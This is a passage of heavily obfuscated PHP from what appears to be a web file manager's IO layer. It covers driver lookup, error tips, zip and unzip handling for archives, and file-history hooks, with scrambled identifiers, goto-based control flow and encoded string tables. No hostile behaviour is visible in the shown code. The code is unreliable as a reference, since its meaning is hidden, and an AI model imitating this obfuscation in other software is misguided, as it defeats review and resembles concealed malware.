&$d©¢ëë·ĞÁ) { goto DæÉæ“ŞäÚ; A»íù£ÀÉ·: switch ($aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[39]]) { case KodIO::KOD_IO: $DºŸ£Ã ¯Š = self::$driverListSystem[$F¤Äì ­è]; break; case KodIO::KOD_SOURCE: $d©¢ëë·ĞÁ = $F¤Äì ­è . $d©¢ëë·ĞÁ; $DºŸ£Ã ¯Š = array($bõŒÛ·ÓÑ[1064] => $bõŒÛ·ÓÑ[1065], $bõŒÛ·ÓÑ[16] => $aŒ¡Õ±Ÿ…); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $E›†µÖÀôê = $GLOBALS[$bõŒÛ·ÓÑ[1066]]; self::$driverListUser = array_to_keyvalue($E›†µÖÀôê, $bõŒÛ·ÓÑ[401]); } $DºŸ£Ã ¯Š = self::$driverListUser[$F¤Äì ­è]; break; case KodIO::KOD_SHARE_LINK: $DºŸ£Ã ¯Š = array($bõŒÛ·ÓÑ[1064] => $bõŒÛ·ÓÑ[1067], $bõŒÛ·ÓÑ[16] => $aŒ¡Õ±Ÿ…); $D´ÔáÕÛÖ = Action($bõŒÛ·ÓÑ[1068])->sharePathInfo($aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[86]]); $d©¢ëë·ĞÁ = $D´ÔáÕÛÖ[$bõŒÛ·ÓÑ[403]]; if (!$D´ÔáÕÛÖ[$bõŒÛ·ÓÑ[403]]) { $B•Ú‚¿Å‰Î = Model($bõŒÛ·ÓÑ[571])->getInfo($D´ÔáÕÛÖ[$bõŒÛ·ÓÑ[476]]); $d©¢ëë·ĞÁ = KodIO::clear($B•Ú‚¿Å‰Î[$bõŒÛ·ÓÑ[1069]] . $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[1062]]); $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[474]] = $B•Ú‚¿Å‰Î; $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[1046]] = $d©¢ëë·ĞÁ; $DºŸ£Ã ¯Š = array($bõŒÛ·ÓÑ[1064] => $bõŒÛ·ÓÑ[1070], $bõŒÛ·ÓÑ[16] => $aŒ¡Õ±Ÿ…); } break; case KodIO::KOD_SHARE_ITEM: $DºŸ£Ã ¯Š = array($bõŒÛ·ÓÑ[1064] => $bõŒÛ·ÓÑ[1071], $bõŒÛ·ÓÑ[16] => $aŒ¡Õ±Ÿ…); $B•Ú‚¿Å‰Î = Model($bõŒÛ·ÓÑ[571])->getInfo($aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[401]]); if ($B•Ú‚¿Å‰Î[$bõŒÛ·ÓÑ[403]] == $bõŒÛ·ÓÑ[201]) { $d©¢ëë·ĞÁ = KodIO::clear($B•Ú‚¿Å‰Î[$bõŒÛ·ÓÑ[1069]] . $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[1062]]); $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[474]] = $B•Ú‚¿Å‰Î; $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[1046]] = $d©¢ëë·ĞÁ; $DºŸ£Ã ¯Š = array($bõŒÛ·ÓÑ[1064] => $bõŒÛ·ÓÑ[1072], $bõŒÛ·ÓÑ[16] => $aŒ¡Õ±Ÿ…); } else { if (!$d©¢ëë·ĞÁ) { $d©¢ëë·ĞÁ = $B•Ú‚¿Å‰Î[$bõŒÛ·ÓÑ[403]]; } } break; default: $d©¢ëë·ĞÁ = $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[86]]; $DºŸ£Ã ¯Š = array($bõŒÛ·ÓÑ[1064] => $bõŒÛ·ÓÑ[1073]); break; } $BØ¨´ÁíË = $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[86]]; if (!isset(self::$driverCache[$BØ¨´ÁíË])) { $bÒ÷›ô§îï = strtolower($DºŸ£Ã ¯Š[$bõŒÛ·ÓÑ[104]]); $C˜«ÙÅ¢î = $GLOBALS[$bõŒÛ·ÓÑ[16]][$bõŒÛ·ÓÑ[98]][$bõŒÛ·ÓÑ[799]]; $A¬èÑ¦Ç¬¸ = $bõŒÛ·ÓÑ[82] . (isset($C˜«ÙÅ¢î[$bÒ÷›ô§îï]) ? $C˜«ÙÅ¢î[$bÒ÷›ô§îï] : ucfirst($bÒ÷›ô§îï)); if (!class_exists($A¬èÑ¦Ç¬¸)) { show_json("{$A¬èÑ¦Ç¬¸}\x20\156\x6f\x74\40\145\170\151\163\x74\x73\x21", !1); } $e±×ä‚Ü¤ = isset($DºŸ£Ã ¯Š[$bõŒÛ·ÓÑ[16]]) ? $DºŸ£Ã ¯Š[$bõŒÛ·ÓÑ[16]] : !1; self::$driverCache[$BØ¨´ÁíË] = new $A¬èÑ¦Ç¬¸($e±×ä‚Ü¤); } goto AÏºãñàğÅ; AÏºãñàğÅ: $cß‰Ç¬ƒÓ = self::$driverCache[$BØ¨´ÁíË]; $cß‰Ç¬ƒÓ->pathDriver = $DŒó™Éí°–; $cß‰Ç¬ƒÓ->pathBase = $bõŒÛ·ÓÑ[43]; goto f™‹§©¯ø; DæÉæ“ŞäÚ: $bõŒÛ·ÓÑ =& $_SERVER[£¶ä½¶¢]; $DŒó™Éí°– = $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[1063]]; $F¤Äì ­è = $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[401]]; goto A»íù£ÀÉ·; B¹œØ®Œ½¨: $cß‰Ç¬ƒÓ->path = $d©¢ëë·ĞÁ; return $cß‰Ç¬ƒÓ; goto A›òõéó¸ä; f™‹§©¯ø: if (isset($DºŸ£Ã ¯Š[$bõŒÛ·ÓÑ[16]][$bõŒÛ·ÓÑ[1074]])) { $cß‰Ç¬ƒÓ->pathBase = rtrim($DºŸ£Ã ¯Š[$bõŒÛ·ÓÑ[16]][$bõŒÛ·ÓÑ[1074]], $bõŒÛ·ÓÑ[18]) . $bõŒÛ·ÓÑ[18]; $d©¢ëë·ĞÁ = $cß‰Ç¬ƒÓ->pathBase . ltrim($d©¢ëë·ĞÁ, $bõŒÛ·ÓÑ[18]); } $d©¢ëë·ĞÁ = $cß‰Ç¬ƒÓ->getPath($d©¢ëë·ĞÁ); if (isset($aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[1046]])) { $d©¢ëë·ĞÁ = $aŒ¡Õ±Ÿ…[$bõŒÛ·ÓÑ[1046]]; } goto B¹œØ®Œ½¨; A›òõéó¸ä: } public static function errorTips($dŒôâ·½×â = false) { goto DÇˆ±ç°…µ; eñõÕ…Û: $E¢õª¬Ëæ[] = $dŒôâ·½×â; write_log($a¦²Ñ¸©ëø[170] . ACTION . $a¦²Ñ¸©ëø[1075] . $dŒôâ·½×â, $a¦²Ñ¸©ëø[1076]); goto BªÂŠ£Æßï; DÇˆ±ç°…µ: $a¦²Ñ¸©ëø =& $_SERVER[£¶ä½¶¢]; static $E¢õª¬Ëæ = array(); $a¥×“³Â§ = 1000; goto Fã‡Ñ‹Ì; Fã‡Ñ‹Ì: if ($dŒôâ·½×â === -1) { return $E¢õª¬Ëæ ? $E¢õª¬Ëæ[count($E¢õª¬Ëæ) - 1] : $a¦²Ñ¸©ëø[43]; } if ($dŒôâ·½×â === !1) { return implode($a¦²Ñ¸©ëø[9], $E¢õª¬Ëæ); } if (count($E¢õª¬Ëæ) >= $a¥×“³Â§) { $E¢õª¬Ëæ = array_slice($E¢õª¬Ëæ, $a¥×“³Â§ * 0.5, $a¥×“³Â§); } goto eñõÕ…Û; BªÂŠ£Æßï: } public static function getLastError($d¤“­óƒ  = '') { $bÔœŠ—ÕÛ× = self::errorTips(-1); return $bÔœŠ—ÕÛ× ? $bÔœŠ—ÕÛ× : $d¤“­óƒ ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $bä§¤ŒÏõè; if (!$bä§¤ŒÏõè) { $E»à¾˜ó = IO::init($_SERVER[£¶ä½¶¢][18]); } return $E»à¾˜ó; } private static function iconvSystem($Døä¶¿Ë‘) { return self::local()->iconvSystem($Døä¶¿Ë‘); } private static function iconvApp($aÅçÊ¿ñçÁ) { return self::local()->iconvApp($aÅçÊ¿ñçÁ); } public static function zip($dÃ¦îäªÕ², $Dá·˜ÇÂ = "\172\x69\x70", $a÷¨ù³ÇŞ = '', $båêÏÚˆÖ = REPEAT_RENAME) { goto D”Çëé“‚; b´‰¿”©†²: $bô·ƒ¦”Ö = !1; if (!$a÷¨ù³ÇŞ && $C†¤Õğõî‰->getType() == $b¦»¯ßï‚â[116]) { $ešÛÂ¿áš = self::zipFileList($dÃ¦îäªÕ²); } else { $bô·ƒ¦”Ö = $a÷¨ù³ÇŞ ? $a÷¨ù³ÇŞ : TEMP_FILES . $b¦»¯ßï‚â[1077] . time() . rand_string(8) . $b¦»¯ßï‚â[18]; mk_dir($bô·ƒ¦”Ö); $ešÛÂ¿áš = self::zipFileList($dÃ¦îäªÕ², $bô·ƒ¦”Ö); } $aáˆÔ’¦¢ = $CÜ‚åƒ«å[$b¦»¯ßï‚â[38]]; goto fÓ¹Å‚‰ğí; AÁß÷Â½µá: if (!$cëí…†³é†) { del_dir($bô·ƒ¦”Ö); show_json(LNG($b¦»¯ßï‚â[1079]), !1); } del_dir($bô·ƒ¦”Ö); return $cëí…†³é†; goto AÃ±ÔÆö£ó; fÓ¹Å‚‰ğí: if (count($ešÛÂ¿áš) > 1) { $A¦Ûâéâå = IO::info(IO::pathFather($CÜ‚åƒ«å[$b¦»¯ßï‚â[86]])); $aáˆÔ’¦¢ = $A¦Ûâéâå[$b¦»¯ßï‚â[38]]; } $b‘µ¿¥ÎËø = $bô·ƒ¦”Ö; if (!$b‘µ¿¥ÎËø) { $b‘µ¿¥ÎËø = get_path_father($CÜ‚åƒ«å[$b¦»¯ßï‚â[86]]); if (!$a÷¨ù³ÇŞ && $C†¤Õğõî‰->getType() == $b¦»¯ßï‚â[116]) { $b‘µ¿¥ÎËø = get_path_father($C†¤Õğõî‰->path); } $fÚæ–ÏÎø˜ = IO::info($b‘µ¿¥ÎËø); if (!$fÚæ–ÏÎø˜[$b¦»¯ßï‚â[206]]) { show_json(LNG($b¦»¯ßï‚â[1078]), !1); } } goto EÔ–Áõ‘‚; EÔ–Áõ‘‚: $D‹‚ÉÔóÁ = $b‘µ¿¥ÎËø . $aáˆÔ’¦¢ . $b¦»¯ßï‚â[105] . $Dá·˜ÇÂ; $D‹‚ÉÔóÁ = get_filename_auto($D‹‚ÉÔóÁ, $b¦»¯ßï‚â[43], $båêÏÚˆÖ); $D¸è‹‡ìºø = self::iconvSystem($D‹‚ÉÔóÁ); goto E¼©¤‡Ÿ; fÓÜÙ²Ğ„: if ($a÷¨ù³ÇŞ || !$bô·ƒ¦”Ö) { if ($bô·ƒ¦”Ö && strstr($bô·ƒ¦”Ö, TEMP_FILES)) { $a„æ„‰„† = $ešÛÂ¿áš = array(); recursion_dir($b‘µ¿¥ÎËø, $a„æ„‰„†, $ešÛÂ¿áš, 0); foreach ($a„æ„‰„† as $CÔ–¹³¹›‹) { del_dir($CÔ–¹³¹›‹); } foreach ($ešÛÂ¿áš as $F•Ş ÑÄİ) { if ($F•Ş ÑÄİ == $D¸è‹‡ìºø) { continue; } del_file($F•Ş ÑÄİ); } } return $D‹‚ÉÔóÁ; } $e­ˆ²­­è = self::pathFather($CÜ‚åƒ«å[$b¦»¯ßï‚â[86]]); $cëí…†³é† = self::move($D‹‚ÉÔóÁ, $e­ˆ²­­è, $båêÏÚˆÖ); goto AÁß÷Â½µá; E¼©¤‡Ÿ: foreach ($ešÛÂ¿áš as $FŠ”ö²­¼ => $Fí°Ö—¼‚Ş) { $ešÛÂ¿áš[$FŠ”ö²­¼] = self::iconvSystem($Fí°Ö—¼‚Ş); } KodArchive::create($D¸è‹‡ìºø, $ešÛÂ¿áš); if (!IO::exist($D‹‚ÉÔóÁ)) { if ($bô·ƒ¦”Ö) { del_dir($bô·ƒ¦”Ö); } show_json(LNG($b¦»¯ßï‚â[1079]), !1); } goto fÓÜÙ²Ğ„; D”Çëé“‚: $b¦»¯ßï‚â =& $_SERVER[£¶ä½¶¢]; $C†¤Õğõî‰ = self::init($dÃ¦îäªÕ²[0][$b¦»¯ßï‚â[86]]); $CÜ‚åƒ«å = self::info($dÃ¦îäªÕ²[0][$b¦»¯ßï‚â[86]]); goto b´‰¿”©†²; AÃ±ÔÆö£ó: } public static function unzip($bëº ‘’–, $A÷Ş“Èã˜· = "\162\145\x70\x6c\141\143\145") { goto eäÇ”ƒÅ„; dŠ‰‹éĞÊ: Hook::trigger($FŠ«“¹Ü»Ú[1087], $bº‹Ã–Áà‚); recursion_dir($bº‹Ã–Áà‚, $B´³ŸÇÆŸ, $cÉâ¤ƒÈÕã, 0); $A”„£Ù„Çæ = array_merge($B´³ŸÇÆŸ, $cÉâ¤ƒÈÕã); goto F©ŸİèÛô; F©ŸİèÛô: foreach ($A”„£Ù„Çæ as $b£ºøˆ®’ß) { $b£ºøˆ®’ß = self::iconvApp($b£ºøˆ®’ß); self::move($b£ºøˆ®’ß, $C†Ñ½‚š×ö, $A÷Ş“Èã˜·); } del_dir($bº‹Ã–Áà‚); if (!$e¿îÜÓŞõË) { del_file($Bù¶»¼ª¢); } goto c–ê»§‰£–; EÔîˆà“‡’: if (!($f¹¯ù§Í—ˆ = parent::info($cŒÒ‰½àÚÄ))) { show_json(LNG($FŠ«“¹Ü»Ú[1081]), !1); } if (!($EØâ£ î• = parent::infoFull($C†Ñ½‚š×ö))) { $C†Ñ½‚š×ö = parent::mkdir($C†Ñ½‚š×ö); $EØâ£ î• = array($FŠ«“¹Ü»Ú[86] => $C†Ñ½‚š×ö); } else { if (isset($EØâ£ î•[$FŠ«“¹Ü»Ú[403]]) && trim($EØâ£ î•[$FŠ«“¹Ü»Ú[86]], $FŠ«“¹Ü»Ú[18]) != trim($C†Ñ½‚š×ö, $FŠ«“¹Ü»Ú[18])) { $c‘­Š¹ Ä = KodIO::make($EØâ£ î•[$FŠ«“¹Ü»Ú[486]]); $AÚæÁ­¡‚À = parent::fileNameAuto($c‘­Š¹ Ä, $EØâ£ î•[$FŠ«“¹Ü»Ú[38]], REPEAT_RENAME_FOLDER, !0); $C†Ñ½‚š×ö = parent::mkdir($c‘­Š¹ Ä . $AÚæÁ­¡‚À); $EØâ£ î• = array($FŠ«“¹Ü»Ú[86] => $C†Ñ½‚š×ö); } } $C†Ñ½‚š×ö = $EØâ£ î•[$FŠ«“¹Ü»Ú[86]]; goto Aà™Úƒœö; c–ê»§‰£–: return !0; goto dŒÓĞÏğï˜; EŒÊ¯÷Ù›¥: mk_dir($bº‹Ã–Áà‚); $e’Ó‚ßÁËÅ = self::fileExt($f¹¯ù§Í—ˆ); $Bù¶»¼ª¢ = $bº‹Ã–Áà‚ . $FŠ«“¹Ü»Ú[105] . $e’Ó‚ßÁËÅ; goto fõöíË‰ì¡; Aà™Úƒœö: $bÚã‰Î¤Ö = self::tmpFileName($f¹¯ù§Í—ˆ); $bº‹Ã–Áà‚ = TEMP_FILES . $bÚã‰Î¤Ö; del_dir($bº‹Ã–Áà‚); goto EŒÊ¯÷Ù›¥; fõöíË‰ì¡: if (!@file_exists(self::iconvSystem($Bù¶»¼ª¢))) { $e¿îÜÓŞõË = self::localFilePath($cŒÒ‰½àÚÄ, $e’Ó‚ßÁËÅ); $Bù¶»¼ª¢ = $e¿îÜÓŞõË ? $e¿îÜÓŞõË : parent::download($cŒÒ‰½àÚÄ, $Bù¶»¼ª¢); } $Bù¶»¼ª¢ = self::iconvSystem($Bù¶»¼ª¢); $fÄÖğİ—ÍÔ = isset($bëº ‘’–[$FŠ«“¹Ü»Ú[1082]]) ? $bëº ‘’–[$FŠ«“¹Ü»Ú[1082]] : $FŠ«“¹Ü»Ú[1083]; goto AÀÍÜ­æÜô; eäÇ”ƒÅ„: $FŠ«“¹Ü»Ú =& $_SERVER[£¶ä½¶¢]; $cŒÒ‰½àÚÄ = $bëº ‘’–[$FŠ«“¹Ü»Ú[86]]; $C†Ñ½‚š×ö = $bëº ‘’–[$FŠ«“¹Ü»Ú[1080]]; goto EÔîˆà“‡’; AÀÍÜ­æÜô: $E”Ûø“²¾¼ = KodArchive::extract($Bù¶»¼ª¢, $bº‹Ã–Áà‚ . $FŠ«“¹Ü»Ú[18], $fÄÖğİ—ÍÔ); self::archiveExt(); if (!$E”Ûø“²¾¼[$FŠ«“¹Ü»Ú[1084]]) { show_json($FŠ«“¹Ü»Ú[1085] . $E”Ûø“²¾¼[$FŠ«“¹Ü»Ú[1086]], !1); } goto dŠ‰‹éĞÊ; dŒÓĞÏğï˜: } public static function unzipList($e ôåŒÖƒİ) { goto cÛàÂºÓµ; aµí‘Ÿ’š„: $Bè¤ÙöÙ = 50000; if (request_url_safe($DÉø³ÃĞ»×)) { $e•½´®Ğ“Á = parse_url_query($DÉø³ÃĞ»×); if (!isset($e•½´®Ğ“Á[$B´¬Ğ÷¯…Ù[86]])) { show_json($B´¬Ğ÷¯…Ù[1089], !1); } } $A´×ïŠ‘ = isset($e•½´®Ğ“Á) ? $e•½´®Ğ“Á[$B´¬Ğ÷¯…Ù[86]] : $DÉø³ÃĞ»×; goto c†©íôÖä¸; EÈİƒ±åÇÆ: if (!is_dir($D´çĞÈ˜ã¶)) { mk_dir($D´çĞÈ˜ã¶); } $fŞ…â‰Ù«‡ = $D´çĞÈ˜ã¶ . $B´¬Ğ÷¯…Ù[18] . $d®Ô…ËÃ´†; if (!@file_exists(self::iconvSystem($fŞ…â‰Ù«‡))) { if (isset($e•½´®Ğ“Á)) { url_request($DÉø³ÃĞ»×, $B´¬Ğ÷¯…Ù[1091], $fŞ…â‰Ù«‡); } else { $cÃĞÖ—æƒ± = self::localFilePath($DÉø³ÃĞ»×, $bä™¸ÀÊ); $fŞ…â‰Ù«‡ = $cÃĞÖ—æƒ± ? $cÃĞÖ—æƒ± : self::download($DÉø³ÃĞ»×, $fŞ…â‰Ù«‡); } } goto E¬ï¢ë‘¬‰; E¬ï¢ë‘¬‰: $fŞ…â‰Ù«‡ = self::iconvSystem($fŞ…â‰Ù«‡); if ($f˜Œê½ƒ• >= 0) { $dØÎÊÏêê = isset($e ôåŒÖƒİ[$B´¬Ğ÷¯…Ù[1092]]) ? $e ôåŒÖƒİ[$B´¬Ğ÷¯…Ù[1092]] : !1; $FŠ†Œ Œ¢« = isset($e ôåŒÖƒİ[$B´¬Ğ÷¯…Ù[38]]) ? $e ôåŒÖƒİ[$B´¬Ğ÷¯…Ù[38]] : $B´¬Ğ÷¯…Ù[43]; KodArchive::filePreview($fŞ…â‰Ù«‡, $f˜Œê½ƒ•, $dØÎÊÏêê, $FŠ†Œ Œ¢«); self::archiveExt(); die; } $A­Íï¨Ù¡ = KodArchive::listContent($fŞ…â‰Ù«‡); goto E ŸÁçï à; c†©íôÖä¸: $eÈÔ†ò÷ˆ¨ = self::info($A´×ïŠ‘); $bä™¸ÀÊ = self::fileExt($eÈÔ†ò÷ˆ¨); $Eµµ›á¦ = self::tmpFileName($eÈÔ†ò÷ˆ¨); goto cÄè‡×èÔª; E ŸÁçï à: self::archiveExt(); del_dir($D´çĞÈ˜ã¶); if (!$A­Íï¨Ù¡[$B´¬Ğ÷¯…Ù[1084]]) { show_json($A­Íï¨Ù¡[$B´¬Ğ÷¯…Ù[1086]], !1); } goto f¬Ä²‘…³; f„‰ãç§Ÿ: return $A­Íï¨Ù¡[$B´¬Ğ÷¯…Ù[1086]]; goto Cí·Ğ—İ„´; f¬Ä²‘…³: $dÕéîŞéÂÏ = json_encode($A­Íï¨Ù¡[$B´¬Ğ÷¯…Ù[1086]]); self::setContent($F»×ŸÍ†¥œ, $dÕéîŞéÂÏ); if (count($A­Íï¨Ù¡[$B´¬Ğ÷¯…Ù[1086]]) >= $Bè¤ÙöÙ) { show_json(sprintf(LNG($B´¬Ğ÷¯…Ù[1090]), count($A­Íï¨Ù¡[$B´¬Ğ÷¯…Ù[1086]])), !1); } goto f„‰ãç§Ÿ; cÛàÂºÓµ: $B´¬Ğ÷¯…Ù =& $_SERVER[£¶ä½¶¢]; $DÉø³ÃĞ»× = $e ôåŒÖƒİ[$B´¬Ğ÷¯…Ù[86]]; $f˜Œê½ƒ• = isset($e ôåŒÖƒİ[$B´¬Ğ÷¯…Ù[1088]]) ? $e ôåŒÖƒİ[$B´¬Ğ÷¯…Ù[1088]] : -1; goto aµí‘Ÿ’š„; cÄè‡×èÔª: if (isset($e•½´®Ğ“Á)) { $a±Ä³ÒÉèË = array($e•½´®Ğ“Á[$B´¬Ğ÷¯…Ù[86]], $e•½´®Ğ“Á[$B´¬Ğ÷¯…Ù[1088]], $e•½´®Ğ“Á[$B´¬Ğ÷¯…Ù[38]]); $d®Ô…ËÃ´† = md5(implode($B´¬Ğ÷¯…Ù[81], $a±Ä³ÒÉèË)) . $B´¬Ğ÷¯…Ù[105] . get_path_ext($e•½´®Ğ“Á[$B´¬Ğ÷¯…Ù[38]]); } else { $a±Ä³ÒÉèË = array($eÈÔ†ò÷ˆ¨[$B´¬Ğ÷¯…Ù[38]], $eÈÔ†ò÷ˆ¨[$B´¬Ğ÷¯…Ù[86]], $eÈÔ†ò÷ˆ¨[$B´¬Ğ÷¯…Ù[88]]); $d®Ô…ËÃ´† = md5(implode($B´¬Ğ÷¯…Ù[81], $a±Ä³ÒÉèË)) . $B´¬Ğ÷¯…Ù[105] . $bä™¸ÀÊ; } if ($f˜Œê½ƒ• == -1) { $F»×ŸÍ†¥œ = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\x56\x69\x65\x77\x2f{$Eµµ›á¦}\57{$d®Ô…ËÃ´†}\x2e\154\157\x67"; $a¹·™ª = self::infoFull($F»×ŸÍ†¥œ); if ($a¹·™ª) { $F»×ŸÍ†¥œ = $a¹·™ª[$B´¬Ğ÷¯…Ù[86]]; $cŒ™Å¿®ê‰ = self::getContent($F»×ŸÍ†¥œ); if ($cŒ™Å¿®ê‰) { $dÕéîŞéÂÏ = json_decode($cŒ™Å¿®ê‰, !0); if (count($dÕéîŞéÂÏ) >= $Bè¤ÙöÙ) { show_json(sprintf(LNG($B´¬Ğ÷¯…Ù[1090]), count($dÕéîŞéÂÏ)), !1); } return $dÕéîŞéÂÏ; } } else { $F»×ŸÍ†¥œ = self::mkfile($F»×ŸÍ†¥œ); } } $D´çĞÈ˜ã¶ = TEMP_FILES . $Eµµ›á¦; goto EÈİƒ±åÇÆ; Cí·Ğ—İ„´: } private static function fileExt($a¢„­ù¼Ğ¸) { $C›‘Ú‡Ğ„ =& $_SERVER[£¶ä½¶¢]; $EÖäò¿‹í‹ = $a¢„­ù¼Ğ¸[$C›‘Ú‡Ğ„[178]]; if ($EÖäò¿‹í‹ == $C›‘Ú‡Ğ„[1093]) { $Eğø›Íé¯ä = $C›‘Ú‡Ğ„[1094]; if (substr($a¢„­ù¼Ğ¸[$C›‘Ú‡Ğ„[38]], -strlen($Eğø›Íé¯ä)) == $Eğø›Íé¯ä) { $EÖäò¿‹í‹ = $C›‘Ú‡Ğ„[1095]; } } self::archiveExt($EÖäò¿‹í‹); return $EÖäò¿‹í‹; } private static function zipFileList($BÀœ²¹Ç«Ë, $CÊ­…¾ªÔŒ = false) { $fÀòŠß¬„ =& $_SERVER[£¶ä½¶¢]; $Dˆ”ó˜Ñ× = array(); foreach ($BÀœ²¹Ç«Ë as $C÷ïé½î) { $dè–š½Ïœ† = $C÷ïé½î[$fÀòŠß¬„[86]]; if ($CÊ­…¾ªÔŒ) { $dè–š½Ïœ† = self::copy($C÷ïé½î[$fÀòŠß¬„[86]], $CÊ­…¾ªÔŒ, $fÀòŠß¬„[791]); } else { $BÃ¾­º¡÷Ë = self::init($C÷ïé½î[$fÀòŠß¬„[86]]); if ($BÃ¾­º¡÷Ë->getType() == $fÀòŠß¬„[116]) { $dè–š½Ïœ† = $BÃ¾­º¡÷Ë->path; } } if ($dè–š½Ïœ† && self::local()->exist($dè–š½Ïœ†)) { $Dˆ”ó˜Ñ×[$C÷ïé½î[$fÀòŠß¬„[86]]] = $dè–š½Ïœ†; } } if (!empty($Dˆ”ó˜Ñ×)) { return array_values($Dˆ”ó˜Ñ×); } show_json(LNG($fÀòŠß¬„[1059]), !1); } public static function tmpFileName($d¯Šã’¿Ù”) { $Aâ·ã°•Ù =& $_SERVER[£¶ä½¶¢]; $b¬«íÆ = array($d¯Šã’¿Ù”[$Aâ·ã°•Ù[38]], $d¯Šã’¿Ù”[$Aâ·ã°•Ù[86]], $d¯Šã’¿Ù”[$Aâ·ã°•Ù[88]], $d¯Šã’¿Ù”[$Aâ·ã°•Ù[495]]); return md5(implode($Aâ·ã°•Ù[81], $b¬«íÆ)); } private static function localFilePath($AµÖ¸ß½, $bøŒ¨¦¥›) { goto bÜô™Š‘¿Î; bÜô™Š‘¿Î: $aÂ¹µêÆ×Ù =& $_SERVER[£¶ä½¶¢]; if ($bøŒ¨¦¥› == $aÂ¹µêÆ×Ù[1096] && strtoupper(substr(PHP_OS, 0, 3)) == $aÂ¹µêÆ×Ù[1097]) { return !1; } $B²ùÔçÊ«Ç = KodIO::parse($AµÖ¸ß½); goto D¸Šêó‘«à; D¸Šêó‘«à: if ($B²ùÔçÊ«Ç[$aÂ¹µêÆ×Ù[39]] == KodIO::KOD_SOURCE) { $b‡¦’„¿Š = Model($aÂ¹µêÆ×Ù[798])->fileInfoGet(KodIO::sourceID($AµÖ¸ß½)); if (!$b‡¦’„¿Š[$aÂ¹µêÆ×Ù[86]]) { show_json($aÂ¹µêÆ×Ù[1098], !1); } $AµÖ¸ß½ = $b‡¦’„¿Š[$aÂ¹µêÆ×Ù[86]]; } $A¸ëÕ‡ŒŠ‹ = self::init($AµÖ¸ß½); $CÇ ›£Ãª = $A¸ëÕ‡ŒŠ‹->getType(); goto Cæ˜çÀ‹Ç; Cæ˜çÀ‹Ç: if ($CÇ ›£Ãª == $aÂ¹µêÆ×Ù[116] || $CÇ ›£Ãª == $aÂ¹µêÆ×Ù[1099]) { if (!$A¸ëÕ‡ŒŠ‹->exist($A¸ëÕ‡ŒŠ‹->path)) { show_json(LNG($aÂ¹µêÆ×Ù[115]), !1); } return $A¸ëÕ‡ŒŠ‹->path; } return !1; goto F£ˆô¤‡Ò¼; F£ˆô¤‡Ò¼: } private static function archiveExt($CáÑµ¬Ôêí = '') { $GLOBALS[$_SERVER[£¶ä½¶¢][1100]] = $CáÑµ¬Ôêí; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto cîµ®©ï§å; cîµ®©ï§å: $bÀÔ¸Ì“¶à =& $_SERVER[£¶ä½¶¢]; $eŞğà¼ğ¯È = $GLOBALS[$bÀÔ¸Ì“¶à[16]][$bÀÔ¸Ì“¶à[98]]; if ($eŞğà¼ğ¯È[$bÀÔ¸Ì“¶à[1101]] != 1) { return; } goto b™ÒÜ×¯¾æ; b™ÒÜ×¯¾æ: if ($eŞğà¼ğ¯È[$bÀÔ¸Ì“¶à[1102]] <= 0) { return; } if (isset($_REQUEST[$bÀÔ¸Ì“¶à[1103]]) && $_REQUEST[$bÀÔ¸Ì“¶à[1103]] == $bÀÔ¸Ì“¶à[97]) { return; } Hook::bind($bÀÔ¸Ì“¶à[1104], $bÀÔ¸Ì“¶à[1105]); goto d§»èø; d§»èø: Hook::bind($bÀÔ¸Ì“¶à[1106], $bÀÔ¸Ì“¶à[1107]); Hook::bind($bÀÔ¸Ì“¶à[1108], $bÀÔ¸Ì“¶à[1109]); Hook::bind($bÀÔ¸Ì“¶à[1110], $bÀÔ¸Ì“¶à[1111]); goto AŒÍØÔ¼½; AŒÍØÔ¼½: Hook::bind($bÀÔ¸Ì“¶à[1112], $bÀÔ¸Ì“¶à[1113]); Hook::bind($bÀÔ¸Ì“¶à[1114], $bÀÔ¸Ì“¶à[1115]); goto D¾äµŒó­; D¾äµŒó­: } public static function eventBeforeUpload($Aæ…àæ½Í³) { if ($Aæ…àæ½Í³[3] && $Aæ…àæ½Í³[3] != REPEAT_REPLACE) { return; } $Càš¸ºÍ‡œ = self::parsePath($Aæ…àæ½Í³[0]); if (!$Càš¸ºÍ‡œ) { return; } self::add($Càš¸ºÍ‡œ); } public static function eventBeforeEdit($c××‹ÉæÈÍ) { $dÛ—·óÑó = self::parsePath($c××‹ÉæÈÍ[0]); if (!$dÛ—·óÑó) { return; } self::add($dÛ—·óÑó); } public static function eventBeforeCopyFile($aÑƒ³½¥Î£, $fó£ƒ±ä³ø, $Dâ»‹–™ã®, $DõŸªŒÚ„’, $f¹­òÕÎŞõ, $dîƒ¢‹¯Ÿö) { $Bîï“ãÈµ = $Dâ»‹–™ã®->getPathOuter($DõŸªŒÚ„’); $EÙñ£°»Ç… = self::parsePath($Bîï“ãÈµ); if (!$EÙñ£°»Ç…) { return; } self::add($EÙñ£°»Ç…); } public static function eventBeforeRename($DÈÅä¯§) { $D³±³ÌÌ =& $_SERVER[£¶ä½¶¢]; $B¥“¼”Î‡© = self::parsePath($DÈÅä¯§[0]); if (!$B¥“¼”Î‡©) { return; } $C˜å–÷Æô = self::checkInHistory($B¥“¼”Î‡©); if (!$C˜å–÷Æô) { return; } if ($C˜å–÷Æô[$D³±³ÌÌ[39]] == $D³±³ÌÌ[203]) { $e‡í‹¢À–ò = self::listData($B¥“¼”Î‡©); if ($e‡í‹¢À–ò && $e‡í‹¢À–ò[$D³±³ÌÌ[376]]) { self::moveHistory($B¥“¼”Î‡©, $DÈÅä¯§[1]); } } else { IO::rename($C˜å–÷Æô[$D³±³ÌÌ[86]], $DÈÅä¯§[1]); } } public static function eventBeforeMove($eÜì³¨Ò·â) { goto 